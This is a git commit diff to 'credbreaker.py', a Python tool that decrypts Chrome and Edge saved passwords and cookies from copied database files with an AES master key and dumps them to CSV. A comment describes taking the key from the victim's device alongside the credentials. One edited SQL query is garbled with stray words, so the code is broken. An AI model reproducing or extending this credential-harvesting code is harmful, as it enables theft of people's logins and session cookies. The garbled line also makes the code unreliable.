a3d698909e0e9b88481259769337b982b48ad431
e-war <elliotwarren17@gmail.com>
2023-04-04 13:27:54 +0100

    v1

--- credbreaker.py
+++ credbreaker.py
@@ -9,6 +9,10 @@ import shutil
 from datetime import datetime, timedelta
 from Crypto.Cipher import AES # pip install pycryptodome
 
+key_path = "./edge_key"
+cookie_path = "./edge_cookies"
+login_path = "./edge_login"
+
 def get_chrome_datetime(chromedate):
     """Return a `datetime.datetime` object from a chrome format datetime
     Since `chromedate` is formatted as the number of microseconds since January, 1601"""
@@ -21,9 +25,9 @@ def get_chrome_datetime(chromedate):
     else:
         return ""
 
-def get_encryption_key(state_path):
+def get_encryption_key():
     # We do not generate the key from state file as this should be taken from the device at the same time as the credentials under their user account.
-    with open("./chrome_key","rb") as f:
+    with open(key_path,"rb") as f:
         mkey = f.read()
         f.close()
     print(mkey)
@@ -42,7 +46,7 @@ def sort_cookies(key, cookie_path):
     db = sqlite3.connect(cookie_path)
     db.text_factory = lambda b: b.decode(errors="ignore")
     cursor = db.cursor()
-    cursor.execute("SELECT host_key, name, value, encrypted_value, expires_utc FROM cookies")
+    cursor.execute("SELECT host_key, name, windows overwrite pin stackoverflowvalue, encrypted_value, expires_utc FROM cookies")
     print("GENERATING COOKIE CSV...")
     with open("./cookies.csv","a",encoding="utf-8") as cocsv:
         cocsv.write("Host,Name,Value,Expires\n")
@@ -76,7 +80,7 @@ def sort_passwords(key,password_path):
             cocsv.write(signon_realm+","+username_value+","+decrypted_value+"\n")
             cocsv.close()
 def main():
-    key = get_encryption_key("./chrome_state")
-    sort_cookies(key,"./google_cookies")
-    sort_passwords(key,"./google_login")
+    key = get_encryption_key()
+    sort_cookies(key,cookie_path)
+    sort_passwords(key,login_path)
 main()
